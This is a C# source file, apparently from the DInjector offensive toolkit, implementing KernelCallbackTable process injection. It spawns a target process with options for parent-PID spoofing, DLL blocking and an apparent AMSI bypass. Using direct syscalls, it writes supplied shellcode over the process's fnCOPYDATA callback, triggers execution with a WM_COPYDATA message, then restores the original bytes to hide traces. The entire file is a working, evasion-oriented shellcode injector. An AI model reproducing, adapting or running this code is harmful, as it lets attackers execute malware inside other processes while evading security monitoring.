using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class RemoteThreadKernelCB
    {
        public static void Execute(byte[] shellcode, string processImage, int ppid = 0, bool blockDlls = false, bool am51 = false, bool debug = false)
        {
            #region CreateProcessA

            var pi = SpawnProcess.Execute(
                processImage,
                @"C:\Windows\System32",
                suspended: false,
                ppid: ppid,
                blockDlls: blockDlls,
                am51: am51);

            IntPtr hProcess = pi.hProcess;
            _ = Win32.WaitForInputIdle(hProcess, 2000);

            #endregion

            #region NtQueryInformationProcess

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint returnLength = 0;

            var ntstatus = Syscalls.NtQueryInformationProcess(
                hProcess,
                PROCESSINFOCLASS.ProcessBasicInformation,
                ref bi,
                (uint)(IntPtr.Size * 6),
                ref returnLength);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtQueryInformationProcess");
            else
                throw new Exception($"(RemoteThreadKernelCB) [-] NtQueryInformationProcess: {ntstatus}");

            IntPtr kernelCallbackAddress = (IntPtr)((Int64)bi.PebBaseAddress + 0x58);

            #endregion

            #region NtReadVirtualMemory (kernelCallbackAddress)

            IntPtr kernelCallback = Marshal.AllocHGlobal(IntPtr.Size);
            uint bytesRead = 0;

            ntstatus = Syscalls.NtReadVirtualMemory(
                hProcess,
                kernelCallbackAddress,
                kernelCallback,
                (uint)IntPtr.Size,
                ref bytesRead);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtReadVirtualMemory, kernelCallbackAddress");
            else
                throw new Exception($"(RemoteThreadKernelCB) [-] NtReadVirtualMemory, kernelCallbackAddress: {ntstatus}");

            byte[] kernelCallbackBytes = new byte[bytesRead];
            Marshal.Copy(kernelCallback, kernelCallbackBytes, 0, (int)bytesRead);
            Marshal.FreeHGlobal(kernelCallback);
            IntPtr kernelCallbackValue = (IntPtr)BitConverter.ToInt64(kernelCallbackBytes, 0);

            #endregion

            #region NtReadVirtualMemory (kernelCallbackValue)

            int dataSize = Marshal.SizeOf(typeof(Win32.KernelCallBackTable));
            IntPtr data = Marshal.AllocHGlobal(dataSize);
            bytesRead = 0;

            ntstatus = Syscalls.NtReadVirtualMemory(
                hProcess,
                kernelCallbackValue,
                data,
                (uint)dataSize,
                ref bytesRead);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtReadVirtualMemory, kernelCallbackValue");
            else
                throw new Exception($"(RemoteThreadKernelCB) [-] NtReadVirtualMemory, kernelCallbackValue: {ntstatus}");

            Win32.KernelCallBackTable kernelStruct = (Win32.KernelCallBackTable)Marshal.PtrToStructure(data, typeof(Win32.KernelCallBackTable));
            Marshal.FreeHGlobal(data);

            #endregion

            #region NtReadVirtualMemory (kernelStruct.fnCOPYDATA)

            IntPtr origData = Marshal.AllocHGlobal(shellcode.Length);
            bytesRead = 0;

            ntstatus = Syscalls.NtReadVirtualMemory(
                hProcess,
                kernelStruct.fnCOPYDATA,
                origData,
                (uint)shellcode.Length,
                ref bytesRead);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtReadVirtualMemory, kernelStruct.fnCOPYDATA");
            else
                throw new Exception($"(RemoteThreadKernelCB) [-] NtReadVirtualMemory, kernelStruct.fnCOPYDATA: {ntstatus}");

            #endregion

            #region NtProtectVirtualMemory (PAGE_READWRITE)

            IntPtr protectAddress = kernelStruct.fnCOPYDATA;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_READWRITE,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, PAGE_READWRITE");
            else
                throw new Exception($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (shellcode)

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                kernelStruct.fnCOPYDATA,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtWriteVirtualMemory, shellcode");
            else
                throw new Exception($"(RemoteThreadKernelCB) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (oldProtect)

            protectAddress = kernelStruct.fnCOPYDATA;
            regionSize = (IntPtr)shellcode.Length;
            uint tmpProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                oldProtect,
                ref tmpProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, oldProtect");
            else
                throw new Exception($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

            #endregion

            #region FindWindowExA

            IntPtr hWindow = Win32.FindWindowExA(IntPtr.Zero, IntPtr.Zero, Process.GetProcessById((int)pi.dwProcessId).ProcessName, null);

            #endregion

            #region SendMessageA

            string msg = "Trigger\0";
            var cds = new Win32.COPYDATASTRUCT
            {
                dwData = new IntPtr(3),
                cbData = msg.Length,
                lpData = msg
            };

            _ = Win32.SendMessageA(hWindow, Win32.WM_COPYDATA, IntPtr.Zero, ref cds);

            #endregion

            #region NtProtectVirtualMemory (PAGE_READWRITE)

            protectAddress = kernelStruct.fnCOPYDATA;
            regionSize = (IntPtr)shellcode.Length;
            oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_READWRITE,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, PAGE_READWRITE");
            else
                throw new Exception($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (origData)

            bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                kernelStruct.fnCOPYDATA,
                origData,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtWriteVirtualMemory, origData");
            else
                throw new Exception($"(RemoteThreadKernelCB) [-] NtWriteVirtualMemory, origData: {ntstatus}");

            Marshal.FreeHGlobal(origData);

            #endregion

            #region NtProtectVirtualMemory (oldProtect)

            protectAddress = kernelStruct.fnCOPYDATA;
            regionSize = (IntPtr)shellcode.Length;
            tmpProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                oldProtect,
                ref tmpProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, oldProtect");
            else
                throw new Exception($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

            #endregion

            Syscalls.NtClose(hWindow);
            Syscalls.NtClose(hProcess);
        }
    }
}
